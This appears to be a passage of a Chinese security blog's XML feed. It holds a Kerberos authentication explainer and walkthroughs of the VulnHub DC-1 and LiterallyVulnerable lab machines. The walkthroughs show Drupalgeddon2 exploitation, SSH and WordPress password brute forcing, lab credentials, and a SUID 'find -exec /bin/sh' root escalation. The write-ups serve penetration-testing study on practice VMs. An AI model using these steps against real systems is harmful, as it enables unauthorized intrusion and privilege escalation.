+<h3 id="第一步-Client-与-AS"><a href="#第一步-Client-与-AS" class="headerlink" title="第一步 Client 与 AS"></a>第一步 Client 与 AS</h3><br>
+
+<blockquote>
+<p>第一步 AS 实现对 Client 身份的确认，并颁发给该 Client 一个 TGT</p>
+</blockquote>
+<p>首先，Client发送一个携带被自身 Master Key加密的身份信息 AS Request到 KDC，KDC验证用户名是否存在于 AD中（KDC 可以通 AD中对应用户名提取该 Client 的 Master Key）</p>
+<ol>
+<li><code>AS Request</code>大致内容：</li>
+</ol>
+<ul>
+<li><code>Pre-authentication data</code>：被 Client 的 Master Key加密过的 Timestamp（Timestamp防爆破）。时间同步（Time Synchronization）显得尤为重要</li>
+<li><code>Client name &amp; realm</code>：<em>Domain name\Client name</em> （Client info）</li>
+<li><code>Server Name</code>：KDC中 TGS 的 Server Name</li>
+</ul>
+<br>
+
+<p>AS 需要验证发送方 <code>Client info</code> 是否为本人（Client的密码对否），所以 AS 只需从 AD中提取 Client对应的 Master Key 对 <code>Pre-authentication data</code> 进行解密，如果是一个合法的 <strong>Timestamp</strong>（时间差距合理），则可以证明发送方提供的用户名是存在于白名单中且密码对应正确的</p>
+<p>验证成功后，返回给 Client一个 <code>AS Response</code>，主要包含两个部分：请求 Client 的 Master Key加密过的 <code>TGS Session Key</code> 和被 KDC（krbtgt 帐户）加密的TGT （<strong>客户端无法解密 TGT</strong>，因为它没有 KDC Hash）</p>
+<ol>
+<li>TGT大致内容：</li>
+</ol>
+<ul>
+<li><code>Session Key</code> : 第一部分的 <code>TGS Session Key</code> （这里的 Session Key 是被 KDC加密,不是 Client）</li>
+<li><code>Client name &amp; realm</code> : <em>Domain name\Client</em> （Client info）</li>
+<li><code>End time</code> : TGT到期的时间</li>
+</ul>
+<br>
+
+<p>KDC此时生成一个 <code>Session Key</code>，使用 Client 用户名对应的 Master Key加密 Session Key，作为 AS数据（第一部分，用于后续与 TGS通讯）；使用 KDC中 krbtgt 帐户 的 Master Key 加密 Session Key 和 <code>Client info</code>，生成TGT（第二部分）</p>
+<p>Client 通过自己的 Master Key 对第一部分解密获得 <code>TGS Session Key</code>后，携带 TGT进入第二步</p>
+<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%B8%80%E6%AD%A5.png" alt="域认证第一步" title="域认证第一步"></p>
+<br>
+
+<h3 id="第二步-Client-与-TGS"><a href="#第二步-Client-与-TGS" class="headerlink" title="第二步 Client 与 TGS"></a>第二步 Client 与 TGS</h3><br>
+
+<blockquote>
+<p>第二步 实现 TGS 对 Client 身份（TGT）的确认，并分发给该 Client 一个 Ticket</p>
+</blockquote>
+<p>Client 使用 AS返回的 <code>TGS Session Key</code> 建立访问 KDC中 TGS服务的请求（<code>TGS Request</code>），再将 TGT 连同请求一起发送到 TGS 服务</p>
+<ol>
+<li><code>TGS Request</code>大致内容：</li>
+</ol>
+<ul>
+<li><code>Authenticator</code>：（Client info + timestamp）通过 <code>TGS Session Key</code>加密</li>
+<li><code>TGT</code> ：（<em>TGS Session Key + Client info + End Time</em>）</li>
+<li><code>Client info</code> ：<em>Domain name/ Client</em></li>
+<li><code>Server info</code> ：Client试图访问的 Server</li>
+<li><code>时间戳</code></li>
+</ul>
+<br>
+
+<p>TGS收到 <code>TGS Request</code>后需要验证 TGT 和 Authenticator；因为 <code>Authenticator</code> 被 <code>TGS Session Key</code> 加密，TGS服务并没有保存这个 Session Key ；于是使用 TGS 自己的 Master Key 解密 TGT 获得其中的 TGS Session Key，进而解密 Authenticator，验证客户端是否受信</p>
+<p>验证成功后，TGS 返回一个 <code>TGS Response</code> ，包含两个消息：加密的 Ticket 和加密的 Session Key</p>
+<ol>
+<li><code>TGS Response</code> 大致内容：</li>
+</ol>
+<ul>
+<li>使用 Server 的 Master Key 进行加密的 Ticket</li>
+<li>通过 <code>TGS Session Key</code> 加密的 <code>Server Session Key</code> （将来 Client与 Server Service的通信使用）</li>
+</ul>
+<ol start="2">
+<li><code>Ticket</code> 大致内容：</li>
+</ol>
+<ul>
+<li>Server Session Key</li>
+<li>Client info</li>
+<li>End time: Ticket的到期时间</li>
+</ul>
+<br>
+
+<p>Client收到 <code>TGS Response</code> 后，使用 <code>TGS Session Key</code> 解密 <code>Server Session Key</code>，得到 Session Key 后，进入第三步</p>
+<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%BA%8C%E6%AD%A5.png" alt="域认证第二步" title="域认证第二步"></p>
+<br>
+
+<h3 id="第三步-Client-和-Server"><a href="#第三步-Client-和-Server" class="headerlink" title="第三步 Client 和 Server"></a>第三步 Client 和 Server</h3><br>
+
+<blockquote>
+<p>第三步，Client 携带 <code>Server Session Key</code> 和 <code>Ticket</code>访问服务器，验证成功后，可以访问 Server资源</p>
+</blockquote>
+<p>Client 通过第二步获的 Server 的 Session Key ，创建用于证明自己就是 Ticket 的真正所有者的 Authenticator 和时间戳，并使用 Server的 Session Key 进行加密</p>
+<p>向服务器请求后，服务器用自己的 Master Key 解密  Ticket ，得到 <em>Server Session Key*，使用 *Server Session Key</em> 解密 Authenticator 进行验证，同上一步一样<br>验证成功后返回给 Client <strong>新时间戳</strong>，<strong>使用 Server Session Key 加密</strong></p>
+<p>Client 通过缓存中的 <code>Server Session Key</code> 解密服务器返回信息，得到新时间戳并验证其是否正确。验证通过的话则客户端可以信赖服务器，并向服务器发送服务请求，服务器向客户端提供相应的服务</p>
+<p>校验通过后，认证成功，该票据会一直存在客户端内存中</p>
+<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%B8%89%E6%AD%A5.png" alt="域认证第三步" title="域认证第三步"></p>
+<br>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
+<li><a href="https://blog.csdn.net/wy_97/article/details/87649262" target="_blank" rel="noopener">windows 域认证 Kerberos详解</a></li>
+<li><a href="https://www.secpulse.com/archives/94848.html" target="_blank" rel="noopener">彻底理解Windows认证 - 议题解读</a></li>
+<li><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">kerberos认证原理—讲的非常细致，易懂</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/Kerberos" target="_blank" rel="noopener">Kerberos</a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Security</tag>
+        <tag>Windows</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-1</title>
+    <url>/2020/03/19/DC-1/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-03-17</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">################## ALL Port ###########################3</span></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) </span><br><span class="line">|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">|/themes//CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">| program version port/proto service</span><br><span class="line">...</span><br><span class="line">35460/tcp open status 1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-目录枚举"><a href="#web-目录枚举" class="headerlink" title="web 目录枚举"></a>web 目录枚举</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">############# /robots.txt ################ #</span></span><br><span class="line"><span class="meta"># robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file is to prevent the crawling and indexing of certain parts</span></span><br><span class="line"><span class="meta"># of your site by web crawlers and spiders run by sites like Yahoo!</span></span><br><span class="line"><span class="meta"># and Google. By telling these <span class="string">"robots"</span> where not to go on your site,</span></span><br><span class="line"><span class="meta"># you save bandwidth and server resources.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file will be ignored unless it is at the root of your host:</span></span><br><span class="line"><span class="meta"># Used:</span></span><br><span class="line"><span class="meta"># Ignored: #</span></span><br><span class="line"><span class="meta"># For more</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.robotstxt.org/wc/robots.html #</span></span></span><br><span class="line"><span class="meta"># For syntax checking, see:</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.sxw.org.uk/computing/robots/check.html</span></span></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: <span class="number">10</span></span><br><span class="line"><span class="meta"># Directories</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/includes/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/misc/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/modules/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/profiles/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/scripts/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/themes/</span></span><br><span class="line"><span class="meta"># Files</span></span><br><span class="line"><span class="symbol">Disallow:</span> /CHANGELOG.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /cron.php</span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.mysql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.pgsql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.sqlite.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /install.php </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /LICENSE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /MAINTAINERS.txt</span><br><span class="line"><span class="symbol">Disallow:</span> /update.php </span><br><span class="line"><span class="symbol">Disallow:</span> /UPGRADE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /xmlrpc.php</span><br><span class="line"><span class="meta"># Paths (clean URLs) </span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/admin/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/comment/</span>reply/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/filter/</span>tips/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/node/</span>add/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/search/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>register/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>password/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>login/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>logout/</span><br><span class="line"><span class="meta"># Paths (no clean URLs)</span></span><br><span class="line"><span class="symbol">Disallow:</span> /?q=admin/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=comment<span class="meta-keyword">/reply/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=filter<span class="meta-keyword">/tips/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=node<span class="meta-keyword">/add/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=search/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/password/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/register/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/login/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/logout/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-17-11-17-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-17-23屏幕截图"> </p>
+<p>逐一访问，得到如下信息：</p>
+<ul>
+<li>CMS：Drupal</li>
+<li>版本：7.X</li>
+</ul>
+<p><img src="2020-03-17-11-48-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-03屏幕截图"> </p>
+<h2 id="漏洞利用-Getshell"><a href="#漏洞利用-Getshell" class="headerlink" title="漏洞利用(Getshell)"></a>漏洞利用(Getshell)</h2><p>搜索历史漏洞，找一个可正常利用的，有的会因为各种问题无法使用</p>
+<p>在 MSF 上搜到几个，挑个利用：</p>
+<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code> </p>
+<p><img src="2020-03-17-11-48-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-51屏幕截图"> </p>
+<p><img src="2020-03-17-12-12-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-12-26屏幕截图"> </p>
+<p><img src="2020-03-17-12-18-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-18-40屏幕截图"></p>
+<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
+<li>登陆用户：www-data</li>
+<li><code>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux</code> </li>
+<li><code>/etc/passwd</code> <ul>
+<li><code>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code> </li>
+</ul>
+</li>
+</ul>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看当前目录，得到一个 flag， <code>flag4</code>用户下得到第二个 flag</p>
+<p><img src="2020-03-17-12-29-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-29-33屏幕截图"></p>
+<p>flag1 提示找 Drupal 的配置文件，百度一下 Drupal 的配置文件一般位于 <code>/var/www/sites/default/</code> </p>
+<p>文件名是 <code>settings.php</code> </p>
+<p> <code>find</code> 一下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name settings.php 2&gt;/dev/null </span><br><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+
+<p>查看后得到 flag2 和一组用户名密码，登陆数据库得到两个用户名(第三个是我自己加的)，密码被加密，暂时没有作用</p>
+<p><img src="%E6%88%AA%E5%B1%8F2020-03-1712.36.32.png" alt="截屏2020-03-1712.36.32"> </p>
+<p><img src="2020-03-17-12-45-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-45-25屏幕截图"> </p>
+<p><img src="2020-03-17-13-16-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-13-16-07屏幕截图"> </p>
+<p><img src="%E6%88%AA%E5%B1%8F2020-03-1916.11.12.png" alt="截屏2020-03-1916.11.12"> </p>
+<h3 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h3><p>flag2 提到了密码爆破不是唯一的方法，可能是通过修改数据库内某个用户的密码，不想这么麻烦</p>
+<p>听歌的时候想到了还有个 flag4 用户，既然存在，那肯定有其道理，试试能不能枚举<br><code>hydra</code> 爆破 ssh，因为刚装的系统，密码字典还没下载，就先用 <code>john</code> 的，还真得到了密码</p>
+<p><img src="2020-03-17-14-25-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-14-25-48屏幕截图"> </p>
+<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>登录 ssh，查看 SUID ，<code>find</code> 提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find	<span class="comment"># &lt;---</span></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown </span><br><span class="line">/usr/lib/openssh/ssh-keysign </span><br><span class="line">/usr/lib/eject/dmcrypt-get-device </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper </span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="%E6%88%AA%E5%B1%8F2020-03-1715.10.08.png" alt="截屏2020-03-1715.10.08"> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"whoami"</span> \; </span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>都提权了，其他 flag 也就无所谓了</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">flag</span></span><br><span class="line"><span class="selector-tag">flag2</span></span><br><span class="line"><span class="selector-tag">flag4</span></span><br><span class="line"><span class="selector-tag">thefinalflag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LiterallyVulnerable</title>
+    <url>/2020/03/19/LiterallyVulnerable/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-03-08 14:26 — 2020-03-09</p>
+</blockquote>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>目标端口服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>全部端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>
+
+<p>开启的端口：21、22、80、65535</p>
+<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
+<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
+<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>
+
+<p>80 端口： nginx + Wordpress</p>
+<p>65535端口：Apache</p>
+<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
+<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+
+<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
+<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
+<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
